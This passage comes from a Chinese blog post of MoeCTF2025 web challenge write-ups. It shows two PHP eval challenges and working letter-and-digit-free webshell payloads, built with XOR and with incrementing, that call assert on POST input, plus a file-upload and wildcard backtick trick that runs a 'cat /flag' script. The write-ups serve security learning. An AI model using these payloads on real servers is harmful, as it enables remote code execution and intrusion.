+<h2 id="这是…Webshell？"><a href="#这是…Webshell？" class="headerlink" title="这是…Webshell？"></a><strong>这是…Webshell？</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了大小写字符，还有数字，可以异或或者取反，paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]); </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127104649539.png" alt="image-20260127104649539"></p>
+<p>同时可以使用自增</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>
+
+<p>使用时payload要进行url编码，这里构造的是（PHP中函数名称是对大小写不敏感的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASSERT($_POST[_])</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127112842494.png" alt="image-20260127112842494"></p>
+<h2 id="这是…Webshell-revenge"><a href="#这是…Webshell-revenge" class="headerlink" title="这是…Webshell?_revenge"></a><strong>这是…Webshell?_revenge</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">  $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">  if (strlen($shell) &gt; 30) &#123;</span><br><span class="line">    die(&quot;error: shell length exceeded&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if (preg_match(&quot;/[A-Za-z0-9_$]/&quot;, $shell)) &#123;</span><br><span class="line">    die(&quot;error: shell not allowed&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  eval($shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两道分别对应了p神的两篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
+<p>这里长度变成了30。其实看了文章照着文章复现就行了。首先这一题就是对照着文章中php5下的那中情况，原理就不在多说，我们要上传一个shell脚本，然后执行，上传表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>shell脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
+
+<p>然后上传文件时抓包</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127165943253.png" alt="image-20260127165943253"></p>
+<p>接下来就是执行我们上传的shell脚本。</p>
+<p>shell&#x3D;?&gt;<?=`.+/???/????????[@-[]`;?></p>
+<p>这里的+是空格。闭合前面的语句，然后执行后面的脚本</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127170235698.png" alt="image-20260127170235698"></p>
+<p>这个毕竟是通配符匹配，多执行两次就会成功。</p>
+<h2 id="23-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#23-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="23 第二十三章 幻境迷心·皇陨星沉(大结局)"></a><strong>23 第二十三章 幻境迷心·皇陨星沉(大结局)</strong></h2><p>具体参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zero_with_one/article/details/153315785">第二十三章 幻境迷心·皇陨星沉(大结局)-CSDN博客</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+    
+        
+
+    
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/01/01/Newstar2025-WEB-MISC/" rel="prev" title="Newstar2025-WEB-MISC">
+      <i class="fa fa-chevron-left"></i> Newstar2025-WEB-MISC
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2048-master"><span class="nav-number">2.1.</span> <span class="nav-text">2048_master</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">2.2.</span> <span class="nav-text">Misc入门指北</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rush"><span class="nav-number">2.3.</span> <span class="nav-text">Rush</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-LSB"><span class="nav-number">2.4.</span> <span class="nav-text">ez_LSB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-%E9%94%9F%E6%96%A4%E6%8B%B7"><span class="nav-number">2.5.</span> <span class="nav-text">ez_锟斤拷????</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weird-photo"><span class="nav-number">2.6.</span> <span class="nav-text">weird_photo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTV"><span class="nav-number">2.7.</span> <span class="nav-text">SSTV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#encrypted-pdf"><span class="nav-number">2.8.</span> <span class="nav-text">encrypted_pdf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%88%E5%9F%BA%E7%B1%B3%E9%9A%BE%E6%B2%A1%E9%9C%B2%E8%BA%B2"><span class="nav-number">2.9.</span> <span class="nav-text">哈基米难没露躲</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%82%E4%BD%8F%E4%B8%80%E5%8F%AA%E8%80%B3"><span class="nav-number">2.10.</span> <span class="nav-text">捂住一只耳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enchantment"><span class="nav-number">2.11.</span> <span class="nav-text">Enchantment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MoeCTF%E6%8C%87%E5%AF%BC%E7%89%88"><span class="nav-number">2.12.</span> <span class="nav-text">MoeCTF指导版</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebRepo"><span class="nav-number">2.13.</span> <span class="nav-text">WebRepo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-ssl"><span class="nav-number">2.14.</span> <span class="nav-text">ez_ssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-png"><span class="nav-number">2.15.</span> <span class="nav-text">ez_png</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E9%87%8C%E6%8C%91%E4%B8%80"><span class="nav-number">2.16.</span> <span class="nav-text">万里挑一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Encrypted-volume"><span class="nav-number">2.17.</span> <span class="nav-text">Encrypted volume</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">3.1.</span> <span class="nav-text">0 Web入门指北</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">3.2.</span> <span class="nav-text">01 第一章 神秘的手镯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">3.3.</span> <span class="nav-text">02 第二章 初识金曦玄轨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">3.4.</span> <span class="nav-text">03 第三章 问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">3.5.</span> <span class="nav-text">05 第五章 打上门来！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">3.6.</span> <span class="nav-text">10 第十章 天机符阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">3.7.</span> <span class="nav-text">12 第十二章 玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">3.8.</span> <span class="nav-text">16 第十六章 昆仑星途</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-number">3.9.</span> <span class="nav-text">Moe笑传之猜猜爆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF-revenge"><span class="nav-number">3.10.</span> <span class="nav-text">01 第一章 神秘的手镯_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">3.11.</span> <span class="nav-text">04 第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">3.12.</span> <span class="nav-text">06 第六章 藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">3.13.</span> <span class="nav-text">07 第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">3.14.</span> <span class="nav-text">09 第九章 星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="nav-number">3.15.</span> <span class="nav-text">13 第十三章 通幽关·灵纹诡影</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">3.16.</span> <span class="nav-text">17 第十七章 星骸迷阵·神念重构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="nav-number">3.17.</span> <span class="nav-text">10 第十章 天机符阵_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="nav-number">3.18.</span> <span class="nav-text">14 第十四章 御神关·补天玉碑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="nav-number">3.19.</span> <span class="nav-text">18 第十八章 万卷诡阁·功法连环</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="nav-number">3.20.</span> <span class="nav-text">20 第二十章 幽冥血海·幻语心魔</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="nav-number">3.21.</span> <span class="nav-text">08 第八章 天衍真言，星图显圣</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-number">3.22.</span> <span class="nav-text">11 第十一章 千机变·破妄之眼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%B8%E9%87%91%E5%81%B6%E9%81%87FLAG%EF%BC%8C%E6%8B%BC%E5%B0%BD%E5%85%A8%E5%8A%9B%E9%9A%BE%E6%88%98"><span class="nav-number">3.23.</span> <span class="nav-text">摸金偶遇FLAG，拼尽全力难战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="nav-number">3.24.</span> <span class="nav-text">15 第十五章 归真关·竞时净魔</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="nav-number">3.25.</span> <span class="nav-text">19 第十九章_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="nav-number">3.26.</span> <span class="nav-text">21 第二十一章 往生漩涡·言灵死局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="nav-number">3.27.</span> <span class="nav-text">22 第二十二章 血海核心·千年手段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell%EF%BC%9F"><span class="nav-number">3.28.</span> <span class="nav-text">这是…Webshell？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell-revenge"><span class="nav-number">3.29.</span> <span class="nav-text">这是…Webshell?_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E7%AB%A0-%E5%B9%BB%E5%A2%83%E8%BF%B7%E5%BF%83%C2%B7%E7%9A%87%E9%99%A8%E6%98%9F%E6%B2%89-%E5%A4%A7%E7%BB%93%E5%B1%80"><span class="nav-number">3.30.</span> <span class="nav-text">23 第二十三章 幻境迷心·皇陨星沉(大结局)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">程序元</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程序元</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">109k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:39</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
